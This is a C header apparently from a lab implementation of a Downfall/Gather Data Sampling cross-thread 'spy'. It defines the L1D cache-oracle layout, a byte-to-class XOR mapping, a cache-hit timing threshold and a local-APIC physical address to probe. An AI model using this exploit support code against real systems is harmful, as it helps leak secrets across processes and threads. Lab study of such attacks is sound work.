/* Shared geometry for the cross-thread GDS spy (labs/downfall/spy).
 *
 * Oracle layout (same L1D rationale as labs/downfall/downfall-oneshot.c):
 *   8 rows, one per byte of the sampled qword;
 *   64 classes per row, stride 0x1040, one class per L1D set;
 *   class = (byte ^ 0x3f) & 0x3f.
 * A hot reload is under HOT_CYCLES.
 */
#ifndef SPY_H
#define SPY_H

#include <stddef.h>
#include <stdint.h>

#define SLOT_SIZE    0x1040
#define NCLASS       64
#define NROWS        8
#define ROW_BYTES    ((size_t)NCLASS * SLOT_SIZE)   /* 0x41000 */
#define ORACLE_BYTES ((size_t)NROWS * ROW_BYTES)    /* 0x208000 */
#define HOT_CYCLES   150
#define XOR_KEY      0x3f

#define CLS_ALT      27   /* 0x24 */
#define CLS_ZERO     63   /* 0x00 */

#define UC_DEFAULT_PHYS 0xfee00000UL  /* local APIC; probe first */

static inline int cls_of(int byte)
{
    return (byte ^ XOR_KEY) & 0x3f;
}

static inline uint8_t *slot(uint8_t *oracle, int row, int cls)
{
    return oracle + (size_t)row * ROW_BYTES + (size_t)cls * SLOT_SIZE;
}

#endif
